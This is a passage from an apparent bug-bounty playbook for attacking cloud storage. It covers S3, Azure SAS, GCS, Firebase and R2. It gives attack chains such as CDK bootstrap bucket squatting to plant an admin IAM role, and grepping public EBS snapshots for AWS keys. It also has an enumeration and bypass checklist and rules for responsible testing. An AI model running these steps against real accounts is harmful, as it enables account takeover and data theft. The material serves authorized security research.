2. Target has never deployed to eu-north-1.
3. aws s3 mb s3://cdk-hnb659fds-assets-<acct>-eu-north-1 --region eu-north-1
4. Wait for victim to bootstrap eu-north-1 deployment
5. Inject CFN template containing an IAM role with adminAccess + assumable by attacker
Severity: CRITICAL — patched in CDK v2.149+; viable only on stale bootstraps
```

### Chain 7 — Public bucket → account ID → EBS snapshot → creds
```
1. Find any public bucket belonging to target
2. s3-account-search → 12-digit account ID
3. aws ec2 describe-snapshots --owner-ids <acct>     # look for public snapshots
4. If public snapshot found → mount → grep -r AKIA /mnt
Severity: HIGH→CRITICAL depending on what's on the disk
```

### Chain 8 — Azure SAS long-expiry → persistent exfil
```
1. Mobile APK embeds SAS: ?sv=2024-...&sr=c&sp=rwl&se=2099-...&sig=...
2. SAS is account-scoped (sr=s + srt=sco) — entire account, not one container
3. Replay token → enumerate all containers, exfil all data
4. SAS expires in 2099 → persistent access
Severity: HIGH+ — depends on stored data sensitivity
```

---

## FALLBACK CHAIN (when nothing shouts)

1. Extract bucket names from JS bundles, source maps, mobile APKs, and HTML.
2. CNAME/DNS sweep across all subdomains for cloud-storage frontends.
3. Pattern-enumerate using company name + common suffixes across 10 regions.
4. Check Wayback Machine for historical S3 references (abandoned-bucket gold).
5. Try `Block Public Access` bypass via `s3:x-amz-server-side-encryption-aws-kms-key-id` condition.
6. Verify with anonymous probes — if 403, retry with `--profile attacker` (AuthenticatedUsers trap).
7. Test presigned-URL endpoints: `filePath=/`, `filePath=../`, `filePath=*`, header-override params.
8. For each AWS-service-managed bucket in scope, build the Bucket-Monopoly name template and probe untouched regions.
9. Walk account ID with `s3:ResourceAccount` if any public read available.
10. For GCS — check `iam.deny` org policy by trying `gsutil iam ch allUsers:objectAdmin`.
11. For Azure — enumerate containers via `?restype=container&comp=list` after DNS resolves.
12. For Firebase — Agneyastra full ladder.
13. For R2 — sweep `pub-*.r2.dev` and any custom domain CORS.
14. Never modify served JS/HTML — text-only PoCs. Sinkholing is *not* serving back.
15. Clean up: remove every uploaded PoC after the report is acknowledged.

---

## SAFETY RAILS (so you don't lose your bounty)

- **Never** replace, modify, or delete victim objects. *Only* upload a marker file with your handle + a UUID + timestamp.
- **Never** serve content back from a re-registered abandoned bucket. Logging-only / sinkhole mode.
- **Never** test SSE-C ransomware on a real bucket. Demonstrate IAM + policy gap, not the exploit.
- **Never** run recursive `aws s3 sync` to completion on multi-GB targets — you'll trigger GuardDuty and look like an exfil actor.
- **Never** upload executable JS/HTML/SVG to a victim bucket. Marker `.txt` only.
- **Never** turn off logging or modify bucket policies on a takeover — leave evidence intact.
- Clean up: remove your test objects after the report is acknowledged. Document the cleanup.

---

## REFERENCES

| Topic | Source |
|---|---|
| watchTowr 8M-requests / 150 abandoned buckets | https://labs.watchtowr.com/8-million-requests-later-we-made-the-solarwinds-supply-chain-attack-look-amateur/ |
| Aqua Bucket Monopoly (Black Hat USA 2024) | https://www.aquasec.com/blog/bucket-monopoly-breaching-aws-accounts-through-shadow-resources/ |
| Aqua CDK bootstrap takeover | https://www.aquasec.com/blog/aws-cdk-risk-exploiting-a-missing-s3-bucket-allowed-account-takeover/ |
| Fog Mistrusted Advisor | https://www.fogsecurity.io/blog/mistrusted-advisor-public-s3-buckets |
| Fog BPA bypass (KMS condition) | https://www.fogsecurity.io/blog/s3-block-public-access-bypass |
| Codefinger SSE-C ransomware | https://www.halcyon.ai/blog/abusing-aws-native-services-ransomware-encrypting-s3-buckets-with-sse-c |
| Sysdig 8-minute AI breach | https://www.sysdig.com/blog/ai-assisted-cloud-intrusion-achieves-admin-access-in-8-minutes |
| Tracebit account-ID enumeration | https://tracebit.com/blog/how-to-find-the-aws-account-id-of-any-s3-bucket |
| Cloudar s3-account-search | https://cloudar.be/awsblog/finding-the-account-id-of-any-public-s3-bucket/ |
| Detectify signed-URL bypass | https://labs.detectify.com/writeups/bypassing-and-exploiting-bucket-upload-policies-and-signed-urls/ |
| $20k presigned-URL bug | https://www.bugbountyexplained.com/my-20000-s3-bug-that-leaked-everyones-attachments-s3-bucket-misconfig-of-pre-signed-urls/ |
| Tea-app Firebase breach | https://medium.com/@tahirbalarabe2/tea-app-security-fail-firebase-leak-reveals-drivers-licenses-selfies-fb8f98d7be13 |
| Agneyastra Firebase kit | https://github.com/redhuntlabs/agneyastra |
| Microsoft Azure Blob attack chain | https://www.microsoft.com/en-us/security/blog/2025/10/20/inside-the-attack-chain-threat-activity-targeting-azure-blob-storage/ |
| Google dangling-bucket guidance | https://cloud.google.com/blog/products/identity-security/best-practices-to-prevent-dangling-bucket-takeovers |
| Intigriti Cloudflare R2 guide | https://www.intigriti.com/researchers/blog/hacking-tools/hacking-misconfigured-cloudflare-r2-buckets-a-complete-guide |
| NetSPI Azure file enumeration | https://www.netspi.com/blog/technical-blog/cloud-pentesting/anonymously-enumerating-azure-file-resources/ |
| Hacking The Cloud (S3 chapter) | https://hackingthe.cloud/aws/ |
| Comparitech 6% GCS public | https://www.comparitech.com/blog/information-security/google-cloud-buckets-unauthorized-access-report/ |
| OpenStack Keystone CVE-2025-65073 | https://zeropath.com/blog/cve-2025-65073-openstack-keystone-ec2-s3-token-bypass |
| m1tz Firebase enumeration | https://blog.m1tz.com/posts/2025/07/hacking-firebase-projects-enumeration-and-common-misconfigurations/ |

Full findings dump: `FINDINGS-REPORT-2025-2026.md` (same directory).
